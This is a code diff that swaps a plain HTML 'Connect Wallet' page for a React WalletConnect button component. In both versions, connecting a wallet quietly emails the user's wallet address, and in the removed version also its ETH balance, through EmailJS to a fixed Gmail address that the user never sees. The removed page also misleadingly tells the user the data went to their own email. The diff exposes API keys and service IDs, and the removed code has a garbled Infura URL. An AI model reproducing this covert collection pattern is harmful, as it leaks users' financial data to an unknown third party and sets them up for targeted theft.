@@ -826,67 +826,61 @@
     </script>
 </body>
 </html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Wallet Connect with Infura</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
-  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-  <script type="text/javascript">
-    (function(){
-        emailjs.init('P1kMBcLFl4q1q0rH7'); // Initialize EmailJS with Public Key
-    })();
-  </script>
-</head>
-<body>
-  <button id="walletConnectBtn" style="position: absolute; top: 10px; right: 10px; padding: 10px 20px; background-color: blue; color: white; border: none; border-radius: 5px; cursor: pointer;">
-    Connect Wallet
-  </button>
+import React, { useState } from "react";
+import WalletConnectProvider from "@walletconnect/web3-provider";
+import Web3 from "web3";
+import emailjs from "@emailjs/browser";
 
-  <script>
-    // Replace with your Infura Project ID
-    const INFURA_PROJECT_ID = 'your-infura-project-id'; // Get this from Infura
+const WalletConnectButton = () => {
+  const [walletAddress, setWalletAddress] = useState("");
+  const [status, setStatus] = useState("");
 
-    // Initialize Web3 with Infura as the provider
-    const infuraProvider = new Web3.providers.HttpProvider(`https://mainnet.infura.io/v3/${wftam4GW365pFq8RwAMZJo6T55UU3r0Lit5/SoXJvQ9VH54G5bPZhQ}`);
-    const web3 = new Web3(infuraProvider);
-
-    document.getElementById('walletConnectBtn').addEventListener('click', async function() {
-      if (window.ethereum) {
-        try {
-          // Request account access via MetaMask
-          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-          const userAddress = accounts[0];
-
-          // Check balance (using Infura)
-          const balance = await web3.eth.getBalance(userAddress);
-          const balanceInEth = web3.utils.fromWei(balance, 'ether');
-
-          // Send the wallet address and balance via EmailJS
-          const templateParams = {
-            user_wallet: userAddress,
-            user_balance: balanceInEth,
-            to_email: 'masterandpuppies@gmail.com'
-          };
-
-          emailjs.send('service_bpnbr64', 'template_c3mko8g', templateParams)
-            .then(function(response) {
-              alert('Wallet connected: ' + userAddress + '\nBalance: ' + balanceInEth + ' ETH\nAddress sent to your email!');
-            }, function(error) {
-              console.error('Failed to send wallet address and balance', error);
-              alert('Failed to send wallet address.');
-            });
-
-        } catch (error) {
-          console.error('Wallet connection failed', error);
-          alert('Could not connect wallet.');
-        }
-      } else {
-        alert('MetaMask is not installed. Please install it to connect your wallet.');
+  const connectWallet = async () => {
+    try {
+      const provider = new WalletConnectProvider({
+        rpc: {
+          8453: "https://base-mainnet.infura.io/v3/b0ecd1fbeb404970b0ede6b398a529f9", // Base Mainnet Infura Project ID
+        },
+      });
+      await provider.enable();
+      const web3 = new Web3(provider);
+      const accounts = await web3.eth.getAccounts();
+      if (accounts.length > 0) {
+        setWalletAddress(accounts[0]);
+        setStatus("✅ Connected successfully!");
+        sendEmail(accounts[0]);
       }
-    });
-  </script>
-</body>
-</html>
+    } catch (error) {
+      setStatus("❌ Wallet connection failed!");
+      console.error("Wallet connection failed", error);
+    }
+  };
+
+  const sendEmail = async (address) => {
+    try {
+      await emailjs.send(
+        "service_bpnbr64", // Service ID
+        "template_c3mko8g", // Template ID
+        { wallet_address: address, to_email: "masterandpuppies@gmail.com" },
+        "P1kMBcLFl4q1q0rH7" // Public API Key
+      );
+      setStatus("✅ Email sent successfully!");
+    } catch (error) {
+      setStatus("❌ Email sending failed!");
+      console.error("Email sending failed", error);
+    }
+  };
+
+  return (
+    <div>
+      <button onClick={connectWallet} style={{ padding: "10px", fontSize: "16px" }}>
+        🔗 Connect Wallet
+      </button>
+      {walletAddress && <p>Connected: {walletAddress}</p>}
+      <p>{status}</p>
+    </div>
+  );
+};
+
+export default WalletConnectButton;
+
